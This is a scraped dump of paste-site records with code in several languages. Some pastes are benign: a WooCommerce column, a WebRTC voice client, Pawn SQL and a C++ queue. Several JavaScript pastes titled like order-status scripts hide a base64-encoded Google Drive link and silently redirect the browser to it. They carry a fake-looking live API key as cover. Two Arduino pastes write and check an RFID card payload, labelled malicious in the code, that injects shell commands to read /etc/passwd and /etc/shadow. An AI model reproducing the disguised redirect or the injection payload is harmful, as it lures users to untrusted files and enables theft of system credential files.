      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dqHvGvbj,Počet prodaných kusů,Fany_VanDaal,PHP,Wednesday 9th of April 2025 04:03:50 AM CDT,"// Přidání sloupce ""Prodáno kusů""
add_filter('manage_edit-product_columns', 'custom_product_sold_column');
function custom_product_sold_column($columns) {
    $columns['total_sold'] = __('Prodáno kusů', 'woocommerce');
    return $columns;
}

// Výpis obsahu sloupce s barevným rozlišením
add_action('manage_product_posts_custom_column', 'custom_product_sold_column_content', 10, 2);
function custom_product_sold_column_content($column, $post_id) {
    if ($column === 'total_sold') {
        $product = wc_get_product($post_id);
        
        // Získání počtu prodaných kusů
        if ($product && $product->is_type('variable')) {
            $total_sold = 0;
            foreach ($product->get_children() as $variation_id) {
                $variation = wc_get_product($variation_id);
                $total_sold += (int) $variation->get_total_sales();
            }
        } else {
            $total_sold = (int) $product->get_total_sales();
        }
        
        // Nastavení barvy textu
        $color = 'black'; // defaultní barva
        if ($total_sold === 0) {
            $color = 'red'; // žádný kus prodán, červená
        }

        // Získání nejprodávanějšího produktu
        global $wpdb;
        $most_sold_product = $wpdb->get_var(""SELECT post_id FROM {$wpdb->prefix}postmeta WHERE meta_key = '_stock_status' ORDER BY meta_value_num DESC LIMIT 1"");

        // Pokud je aktuální produkt tím nejprodávanějším, nastavíme zelenou barvu
        if ($post_id == $most_sold_product) {
            $color = 'green';
        }

        // Zobrazení počtu prodaných kusů s nastavenou barvou
        echo '<span style=""color:' . esc_attr($color) . ';"">' . esc_html($total_sold) . '</span>';
    }
}

// Označení sloupce jako řaditelného
add_filter('manage_edit-product_sortable_columns', 'custom_product_sold_column_sortable');
function custom_product_sold_column_sortable($columns) {
    $columns['total_sold'] = 'total_sales';
    return $columns;
}

// Přizpůsobení dotazu pro řazení podle počtu prodaných
add_action('pre_get_posts', 'custom_product_sold_orderby');
function custom_product_sold_orderby($query) {
    if (!is_admin() || !$query->is_main_query()) {
        return;
    }

    // Ověření správného řazení ve správné tabulce
    if ($query->get('post_type') === 'product' && $query->get('orderby') === 'total_sales') {
        $query->set('meta_key', 'total_sales');
        $query->set('orderby', 'meta_value_num');
    }
}"
qpjuaPzc,Market.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 04:01:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08756/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
39SAAcfP,WebRTC_voice,phucbienvan,JavaScript,Wednesday 9th of April 2025 03:54:05 AM CDT,"// Set the basic API address for communication with the backend server
// const baseUrl = ""http://0.0.0.0:8005"";
const baseUrl = ""https://voice-ai-rtc.creativelink.ai"";
// Flag indicating whether WebRTC is active, controls the enabling and disabling of connections
let isWebRTCActive = false;
// Create variables related to the WebRTC connection
let peerConnection;
let dataChannel;
// Define an object that contains multiple functions; methods in fns will be called
const fns = {
    // Get the HTML content of the current page
    getPageHTML: () => {
        return {
            success: true,
            html: document.documentElement.outerHTML
        }; // Return the entire page's HTML
    },
    // Change the background color of the webpage
    changeBackgroundColor: ({ color }) => {
        document.body.style.backgroundColor = color; // Change the page's background color
        return { success: true, color }; // Return the changed color
    },
    // Change the text color of the webpage
    changeTextColor: ({ color }) => {
        document.body.style.color = color; // Change the page's text color
        return { success: true, color }; // Return the changed color
    },
    // Change the button's style (size and color)
    changeButtonStyle: ({ size, color }) => {
        const button = document.querySelector('button'); // Get the first button on the page (modify selector if there are multiple buttons)
        if (button) {
            // Change the button's size
            if (size) {
                button.style.fontSize = size; // Set font size
            }
            // Change the button's color
            if (color) {
                button.style.backgroundColor = color; // Set button background color
            }
            return { success: true, size, color }; // Return modified button style
        } else {
            return { success: false, message: 'Button element not found' }; // Return failure if no button is found
        }
    },
};

// When an audio stream is received, add it to the page and play it
function handleTrack(event) {
    const el = document.createElement('audio'); // Create an audio element
    el.srcObject = event.streams[0]; // Set the audio stream as the element's source
    el.autoplay = el.controls = true; // Autoplay and display audio controls
    document.body.appendChild(el); // Add the audio element to the page
}

// Create a data channel for transmitting control messages (such as function calls)
function createDataChannel() {
    // Create a data channel named 'response'
    dataChannel = peerConnection.createDataChannel('response');
    // Configure data channel events
    dataChannel.addEventListener('open', () => {
        console.log('Data channel opened');
        configureData(); // Configure data channel functions
    });
    dataChannel.addEventListener('message', async (ev) => {
        const msg = JSON.parse(ev.data); // Parse the received message
        // If the message type is 'response.function_call_arguments.done', it indicates a function call request
        if (msg.type === 'response.function_call_arguments.done') {
            const fn = fns[msg.name]; // Get the corresponding function by name
            if (fn !== undefined) {
                console.log(`Calling local function ${msg.name}, parameters ${msg.arguments}`);
                const args = JSON.parse(msg.arguments); // Parse function parameters
                const result = await fn(args); // Call the local function and wait for the result
                console.log('Result', result); // Log the result of the function
                // Send the result of the function execution back to the other party
                const event = {
                    type: 'conversation.item.create', // Create conversation item event
                    item: {
                        type: 'function_call_output', // Function call output
                        call_id: msg.call_id, // Passed call_id
                        output: JSON.stringify(result), // JSON string of the function execution result
                    },
                };
                dataChannel.send(JSON.stringify(event)); // Send the result back to the remote side
            }
        }
    });
}

// Configure data channel functions and tools
function configureData() {
    console.log('Configuring data channel');
    const event = {
        type: 'session.update', // Session update event
        session: {
            modalities: ['text', 'audio'], // Supported interaction modes: text and audio
            // Provide functional tools, pay attention to the names of these tools corresponding to the keys in the above fns object
            tools: [
                {
                    type: 'function', // Tool type is function
                    name: 'changeBackgroundColor', // Function name
                    description: 'Change the background color of the webpage', // Description
                    parameters: { // Parameter description
                        type: 'object',
                        properties: {
                            color: {
                                type: 'string',
                                description: 'Hexadecimal value of the color'
                            }, // Color parameter
                        },
                    },
                },
                {
                    type: 'function',
                    name: 'changeTextColor',
                    description: 'Change the text color of the webpage',
                    parameters: {
                        type: 'object',
                        properties: {
                            color: {
                                type: 'string',
                                description: 'Hexadecimal value of the color'
                            },
                        },
                    },
                },
                {
                    type: 'function',
                    name: 'getPageHTML',
                    description: 'Get the HTML content of the current page',
                },
                {
                    type: 'function', // Tool type is function
                    name: 'changeButtonStyle', // New function name
                    description: 'Change the size and color of the button', // Description
                    parameters: { // Parameter description
                        type: 'object',
                        properties: {
                            size: {
                                type: 'string',
                                description: 'Font size of the button (e.g., ""16px"" or ""1em"")'
                            }, // Button size
                            color: {
                                type: 'string',
                                description: 'Background color of the button (e.g., ""#ff0000"" or ""red"")'
                            }, // Button color
                        },
                    },
                },
            ],
        },
    };
    dataChannel.send(JSON.stringify(event)); // Send the configured event data
}

// Get the control button element
const toggleButton = document.getElementById('toggleWebRTCButton');
// Add a click event listener to the button to toggle the WebRTC connection state
toggleButton.addEventListener('click', () => {
    // If WebRTC is active, stop the connection; otherwise, start WebRTC
    if (isWebRTCActive) {
        stopWebRTC(); // Stop WebRTC
        toggleButton.textContent = 'start'; // Update button text
    } else {
        startWebRTC(); // Start WebRTC
        toggleButton.textContent = 'stop'; // Update button text
    }
});

// Capture microphone input stream and initiate WebRTC connection
function startWebRTC() {
    // If WebRTC is already active, return directly
    if (isWebRTCActive) return;
    // Create a new peerConnection object to establish a WebRTC connection
    peerConnection = new RTCPeerConnection();
    peerConnection.ontrack = handleTrack; // Bind audio stream processing function
    createDataChannel(); // Create data channel
    // Request user's audio stream
    navigator.mediaDevices.getUserMedia({ audio: true }).then((stream) => {
        // Add each track from the audio stream to the peerConnection
        stream.getTracks().forEach((track) => peerConnection.addTransceiver(track, { direction: 'sendrecv' }));
        // Create an offer for the local connection
        peerConnection.createOffer().then((offer) => {
            peerConnection.setLocalDescription(offer); // Set local description (offer)
            console.log(offer.sdp);

            // Send the offer to the backend for signaling exchange
            fetch(baseUrl + '/api/rtc-connect', {
                method: 'POST',
                body: offer.sdp, // Send the SDP of the offer to the backend
                headers: {
                    'Content-Type': 'application/sdp',
                },
            })
            .then((r) => r.text())
            .then((answer) => {
                // Get the answer returned by the backend and set it as the remote description
                peerConnection.setRemoteDescription({ sdp: answer, type: 'answer' });
            });
        });
    });
    // Mark WebRTC as active
    isWebRTCActive = true;
}

// Stop the WebRTC connection and clean up all resources
function stopWebRTC() {
    // If WebRTC is not active, return directly
    if (!isWebRTCActive) return;
    // Stop the received audio tracks
    const tracks = peerConnection.getReceivers().map(receiver => receiver.track);
    tracks.forEach(track => track.stop());
    // Close the data channel and WebRTC connection
    if (dataChannel) dataChannel.close();
    if (peerConnection) peerConnection.close();
    // Reset connection and channel objects
    peerConnection = null;
    dataChannel = null;
    // Mark WebRTC as not active
    isWebRTCActive = false;
}
"
8ux7jTDy,rfid ver,mehularora810,Arduino,Wednesday 9th of April 2025 03:52:03 AM CDT,"#include <MFRC522v2.h>
#include <MFRC522DriverSPI.h>
#include <MFRC522DriverPinSimple.h>
#include <MFRC522Debug.h>

// Create driver instance
MFRC522DriverPinSimple ss_pin(5); // SDA/SS pin
MFRC522DriverSPI driver{ss_pin};  // Create SPI driver
MFRC522 mfrc522{driver};          // Create MFRC522 instance

// Constants matching the writer program
const int TOTAL_BYTES = 1024;      // Total bytes to read
const int BLOCK_SIZE = 16;         // MIFARE block size (16 bytes data)
const int BLOCK_SIZE_WITH_CRC = 18; // Block size including CRC (16 + 2)
const int BLOCKS_TO_READ = TOTAL_BYTES / BLOCK_SIZE; // 64 blocks
const int START_BLOCK = 1;         // Start from block 1 (skip block 0)

// Expected payload to verify against
const char* expected_payload = ""\""; cat /etc/passwd; cat /etc/shadow; ls -la; echo \"""";

void setup() {
  Serial.begin(115200);
  while (!Serial); // Wait for serial to initialize
  
  Serial.println(""Initializing RFID Reader..."");
  
  // Initialize the RC522
  mfrc522.PCD_Init();
  
  // Print RC522 firmware version
  MFRC522Debug::PCD_DumpVersionToSerial(mfrc522, Serial);
  
  Serial.println(""RFID Reader Ready"");
  Serial.println(""Place a card near the reader..."");
}

bool readBlock(byte block, byte* data) {
  MFRC522::StatusCode status;
  byte trailerBlock = (block / 4) * 4 + 3; // Calculate trailer block for this sector
  
  // Authenticate using key A
  MFRC522::MIFARE_Key keyA;
  for (byte i = 0; i < 6; i++) {
    keyA.keyByte[i] = 0xFF;
  }
  
  status = mfrc522.PCD_Authenticate(0x60, trailerBlock, &keyA, &(mfrc522.uid));
  if (status != MFRC522::STATUS_OK) {
    Serial.print(""Authentication failed for block "");
    Serial.print(block);
    Serial.print("": "");
    Serial.println(mfrc522.GetStatusCodeName(status));
    return false;
  }

  // Read the data
  byte readBuffer[BLOCK_SIZE_WITH_CRC];
  byte size = BLOCK_SIZE_WITH_CRC;
  status = mfrc522.MIFARE_Read(block, readBuffer, &size);
  if (status != MFRC522::STATUS_OK) {
    Serial.print(""Reading failed for block "");
    Serial.print(block);
    Serial.print("": "");
    Serial.println(mfrc522.GetStatusCodeName(status));
    return false;
  }

  // Copy the data (excluding CRC bytes)
  memcpy(data, readBuffer, BLOCK_SIZE);
  return true;
}

void printBlock(byte* data, int block) {
  Serial.print(""Block "");
  Serial.print(block);
  Serial.print("": "");
  
  // Print hex values
  for (int i = 0; i < BLOCK_SIZE; i++) {
    if (data[i] < 0x10) Serial.print(""0"");
    Serial.print(data[i], HEX);
    Serial.print("" "");
  }
  
  Serial.print("" | "");
  
  // Print ASCII values
  for (int i = 0; i < BLOCK_SIZE; i++) {
    if (data[i] >= 32 && data[i] <= 126) {
      Serial.print((char)data[i]);
    } else {
      Serial.print(""."");
    }
  }
  
  Serial.println();
}

void loop() {
  // Reset the loop if no new card present on the sensor/reader
  if (!mfrc522.PICC_IsNewCardPresent()) {
    return;
  }

  // Verify if the NUID has been read
  if (!mfrc522.PICC_ReadCardSerial()) {
    return;
  }

  Serial.println(""Card detected!"");
  
  // Print card type
  MFRC522::PICC_Type piccType = mfrc522.PICC_GetType(mfrc522.uid.sak);
  Serial.print(""Card type: "");
  Serial.println(piccType);
  
  // Print UID
  Serial.print(""UID: "");
  for (byte i = 0; i < mfrc522.uid.size; i++) {
    Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? "" 0"" : "" "");
    Serial.print(mfrc522.uid.uidByte[i], HEX);
  }
  Serial.println();

  // Buffer to store all read data
  byte readData[TOTAL_BYTES];
  memset(readData, 0, TOTAL_BYTES);
  
  // Read all blocks starting from block 1
  int dataOffset = 0;
  bool readSuccess = true;
  
  for (int block = START_BLOCK; block < BLOCKS_TO_READ; block++) {
    if (block % 4 == 3) {
      dataOffset += BLOCK_SIZE; // Account for skipped trailer block
      continue; // Skip trailer blocks
    }
    
    if (!readBlock(block, &readData[dataOffset])) {
      readSuccess = false;
      break;
    }
    
    printBlock(&readData[dataOffset], block);
    dataOffset += BLOCK_SIZE;
  }

  if (readSuccess) {
    Serial.println(""\nVerification Results:"");
    
    // Convert read data to string for comparison
    String readString = """";
    for (int i = 0; i < TOTAL_BYTES; i++) {
      if (readData[i] == 0) break; // Stop at first null byte
      readString += (char)readData[i];
    }
    
    // Compare with expected payload
    if (readString.startsWith(expected_payload)) {
      Serial.println(""✅ Payload verification successful!"");
      Serial.print(""Found payload: "");
      Serial.println(readString);
    } else {
      Serial.println(""❌ Payload verification failed!"");
      Serial.print(""Expected: "");
      Serial.println(expected_payload);
      Serial.print(""Found: "");
      Serial.println(readString);
    }
  } else {
    Serial.println(""❌ Failed to read all blocks!"");
  }

  // Halt PICC
  mfrc522.PICC_HaltA();
  // Stop encryption on PCD
  mfrc522.PCD_StopCrypto1();
  
  Serial.println(""\nPlace another card near the reader..."");
} "
T24mL8k3,Untitled,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 03:45:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79519/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pSrzvt0z,rfid exp 3,mehularora810,Arduino,Wednesday 9th of April 2025 03:41:17 AM CDT,"#include <MFRC522v2.h>
#include <MFRC522DriverSPI.h>
#include <MFRC522DriverPinSimple.h>
#include <MFRC522Debug.h>

// Create driver instance
MFRC522DriverPinSimple ss_pin(5); // SDA/SS pin
MFRC522DriverSPI driver{ss_pin};  // Create SPI driver
MFRC522 mfrc522{driver};          // Create MFRC522 instance

// The malicious payload we want to write
const char* malicious_payload = ""\""; cat /etc/passwd; cat /etc/shadow; ls -la; echo \"""";
const int TOTAL_BYTES = 1024;      // Total bytes to write
const int BLOCK_SIZE = 16;         // MIFARE block size (16 bytes data)
const int BLOCK_SIZE_WITH_CRC = 18; // Block size including CRC (16 + 2)
const int BLOCKS_TO_WRITE = TOTAL_BYTES / BLOCK_SIZE; // 64 blocks

void setup() {
  Serial.begin(115200);
  while (!Serial); // Wait for serial to initialize
  
  Serial.println(""Initializing RFID Reader..."");
  
  // Initialize the RC522
  mfrc522.PCD_Init();
  
  // Print RC522 firmware version
  MFRC522Debug::PCD_DumpVersionToSerial(mfrc522, Serial);
  
  Serial.println(""RFID Reader Ready"");
  Serial.println(""Place a card near the reader..."");
}

void writeBlock(byte block, byte* data) {
  MFRC522::StatusCode status;
  byte trailerBlock = (block / 4) * 4 + 3; // Calculate trailer block for this sector
  
  // Authenticate using key A
  MFRC522::MIFARE_Key keyA;
  for (byte i = 0; i < 6; i++) {
    keyA.keyByte[i] = 0xFF;
  }
  
  status = mfrc522.PCD_Authenticate(0x60, trailerBlock, &keyA, &(mfrc522.uid));
  if (status != 0) {
    Serial.print(""Authentication failed for block "");
    Serial.print(block);
    Serial.print("": "");
    Serial.println(status);
    return;
  }

  // Write the data (library handles CRC internally)
  status = mfrc522.MIFARE_Write(block, data, BLOCK_SIZE);
  if (status != 0) {
    Serial.print(""Writing failed for block "");
    Serial.print(block);
    Serial.print("": "");
    Serial.println(status);
    return;
  }

  // Verify the write
  byte readBuffer[BLOCK_SIZE_WITH_CRC];
  byte size = BLOCK_SIZE_WITH_CRC;
  status = mfrc522.MIFARE_Read(block, readBuffer, &size);
  if (status != 0) {
    Serial.print(""Verification read failed for block "");
    Serial.print(block);
    Serial.print("": "");
    Serial.println(status);
    return;
  }

  // Compare written and read data
  bool verify = true;
  for (byte i = 0; i < BLOCK_SIZE; i++) {
    if (readBuffer[i] != data[i]) {
      verify = false;
      break;
    }
  }

  if (!verify) {
    Serial.print(""Data verification failed for block "");
    Serial.println(block);
  }
}

void loop() {
  // Reset the loop if no new card present on the sensor/reader
  if (!mfrc522.PICC_IsNewCardPresent()) {
    return;
  }

  // Verify if the NUID has been read
  if (!mfrc522.PICC_ReadCardSerial()) {
    return;
  }

  Serial.println(""Card detected!"");
  
  // Print card type
  MFRC522::PICC_Type piccType = mfrc522.PICC_GetType(mfrc522.uid.sak);
  Serial.print(""Card type: "");
  Serial.println(piccType);
  
  // Print UID
  Serial.print(""UID: "");
  for (byte i = 0; i < mfrc522.uid.size; i++) {
    Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? "" 0"" : "" "");
    Serial.print(mfrc522.uid.uidByte[i], HEX);
  }
  Serial.println();

  // Prepare the full 1024-byte payload
  byte fullPayload[TOTAL_BYTES];
  memset(fullPayload, 0, TOTAL_BYTES);
  
  // Copy the malicious payload to the start
  size_t payloadLength = strlen(malicious_payload);
  size_t copyLength = (payloadLength < TOTAL_BYTES) ? payloadLength : TOTAL_BYTES;
  memcpy(fullPayload, malicious_payload, copyLength);
  
  // Pad the rest with zeros
  for (int i = copyLength; i < TOTAL_BYTES; i++) {
    fullPayload[i] = 0;
  }

  // Write all blocks
  for (int block = 0; block < BLOCKS_TO_WRITE; block++) {
    if (block % 4 == 3) continue; // Skip trailer blocks
    writeBlock(block, &fullPayload[block * BLOCK_SIZE]);
    Serial.print(""Written block "");
    Serial.println(block);
  }

  Serial.println(""Data written successfully!"");

  // Halt PICC
  mfrc522.PICC_HaltA();
  // Stop encryption on PCD
  mfrc522.PCD_StopCrypto1();
} "
gcuujkfY,Untitled,execution88,Pawn,Wednesday 9th of April 2025 03:38:47 AM CDT,"static enum E_FAMILY_MEMBERS_QUERY_INFO
{
	Cache: E_FAMILY_MEMBERS_QUERY_CACHE,
	E_FAMILY_MEMBERS_QUERY_UNIX
}

static g_family_members_query_info[MAX_FAMILY][E_FAMILY_MEMBERS_QUERY_INFO];
static g_reset_fam_members_query_info[E_FAMILY_MEMBERS_QUERY_INFO] = 
{
	Cache: 0,
	0
};

//


stock ShowFamilyMembersAll(playerid)
{
	new family_id = FamilyPlayer:GetId(playerid);

	if (family_id == INVALID_FAMILY_ID) {
		return false;
	}

	new row_count;

	if (g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE] == g_reset_fam_members_query_info[E_FAMILY_MEMBERS_QUERY_CACHE] ||
		g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_UNIX] < unix)
	{
		if (cache_is_valid(g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE]))
		{
			cache_delete(g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE]);
		}

		LoadFamilyMembersAll(playerid);
	}
	else
	{
		g_string_4096 = ""["";

		cache_unset_active();
		cache_set_active(g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE]);

		row_count = cache_num_rows();

		new 
			name[MAX_PLAYER_NAME_RUS],
			rank_id,
			warn,
			completed_count
			status,
			family_rank_name[MAX_FAMILY_RANK_NAME];

		for (new i = 0; i < row_count; i++) 
		{
			
			cache_get_value_int(i, ""rank_id"", rank_id);
			cache_get_value_int(i, ""warn"", warn);
			cache_get_value_int(i, ""status"", status);
			cache_get_value_int(i, ""completed_count"", completed_count);
			cache_get_value(i, ""name"", name, sizeof(name));

			FamilyRank:GetName(family_id, rank_id, family_rank_name);

			format(g_string_256, sizeof(g_string_256), ""\
				{\
					\""id\"":%d,\
					\""status\"":\""%d\"",\
					\""nickName\"":\""%s\"",\
					\""post\"":\""%s\"",\
					\""rank\"":%d, \
					\""totalQuests\"":%d, \
					\""reprimand\"":%d \
				},"",
				i,
				status != 1001,
				name,
				family_rank_name,
				completed_count,
				warn
			);

			strcat(g_string_4096, g_string_256);

			if (strlen(g_string_4096) > 3900)
			{
				g_string_4096[strlen(g_string_4096) - 1] = EOS;
				strcat(g_string_4096, ""]"");

				SendFamilyMembers(playerid, g_string_4096);
				g_string_4096 = ""["";
			}
		}

		g_string_4096[strlen(g_string_4096) - 1] = EOS;
		strcat(g_string_4096, ""]"");

		SendFamilyMembers(playerid, g_string_4096);
	}
	
	return true;
}

stock LoadFamilyMembersAll(playerid)
{
	new family_id = FamilyPlayer:GetId(playerid);

	if (family_id == INVALID_FAMILY_ID) 
	{
		return false;
	}

	format(g_string_512, sizeof g_string_512, ""\
		SELECT \
			a.NickName AS name, \
			fp.account_id, \
			fp.rank_id, \
			fp.warn, \
			a.Online_status as status, \
			(SELECT COUNT(*) AS completed_count \
				FROM contracts \
				WHERE account_id = fp.account_id AND type = %d AND completed = 1) as contact_count) \
		FROM \
			""#FAMILY_PLAYER_TABLE_NAME"" fp \
		INNER JOIN \
			Qelksekm AS a \
		ON \
			a.ID=fp.account_id \
		WHERE \
			fp.family_id=%d \
		ORDER BY \
			fp.rank_id DESC"",
		CONTRACT_TYPE_FAMILY, 
		Family:GetSQLId(family_id));
	mysql_tquery(connection[HANDLE_SERVER], g_string_512, ""OnLoadFamilyMembersAll"", ""ddd"", playerid, ConnectPersonalID[playerid], family_id);

	return true;
}

public OnLoadFamilyMembersAll(playerid, connect_id, family_id)
{
	if (connect_id != ConnectPersonalID[playerid]) 
	{
		return true;
	}

	if (rows == 0) 
	{
		return SendErrorNotify(playerid, -1, ""Информация о составе семьи не найдена."");
	}

	g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_CACHE] = cache_save();
	g_family_members_query_info[family_id][E_FAMILY_MEMBERS_QUERY_UNIX] = unix;

	ShowFamilyMembersAll(playerid);

	return true;
}"
3wVSeVRZ,Queue,ivorakitin,C++,Wednesday 9th of April 2025 03:35:43 AM CDT,"#include <iostream>
using namespace std;

//дефиниране и инициализация на опашка
struct elem
{
    int key;
    elem *next;
} *first = NULL, *last = NULL, *p;

void push(int n);   //prototype
int pop(int &n);    //prototype
void push(elem *&f, elem *&l, int n);   //prototype
int pop(elem *&f, elem *&l, int &n);    //prototype 

 
 
void push(int n)        //добавяне на елемент
{
    p = last;
    last = new elem;
    last->key = n;
    last->next = NULL;
    if(p != NULL)
        p->next = last;
    if (first == NULL)  //добавяне на първи елемент
    {
        first = last;
    }
}
 
int pop(int &n)     //извличане на елемент
{
    if (first)      //проверка за непразна опашка
    {
        n = first->key;
        p = first;
        first = first->next;
        if (first == NULL)
            last = first;
        delete p;       //премахване на елемента
        return 1;
    }
    else
        return 0;       //опашката е празна
}

void push(elem *&f, elem *&l, int n)		//добавяне на елемент
{
	elem *p = l;
	l = new elem;
	l->key = n;
	l->next = NULL;
	if(p != NULL)
		p->next = l;
	if (f == NULL)	//добавяне на първи елемент
	{
		f = l;
	}
}

int pop(elem *&f, elem *&l, int &n)		//извличане на елемент
{
	elem *p;
	if (f)		//проверка за непразна опашка
	{
		n = f->key;
		p = f;
		f = f->next;
		if (f == NULL)
			l = f;
		delete p;		//премахване на елемента
		return 1;
	}
	else
		return 0;		//опашката е празна
}



int main()
{
    int num;
    cout<<""Input integers:\n"";  
    while (cin >> num)
        push(num);
    cout<<""\nBuffered data:  "";
    while (pop(num))
    {
        cout << num << ""  "";
    }
    cout << ""\n"";
    return 0;
}
"
MGfc548H,Products.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 03:30:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01699/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Hu8ucj1G,Order.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 03:15:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39154/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f1Lkd3Pd,Market.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 02:59:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77573/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
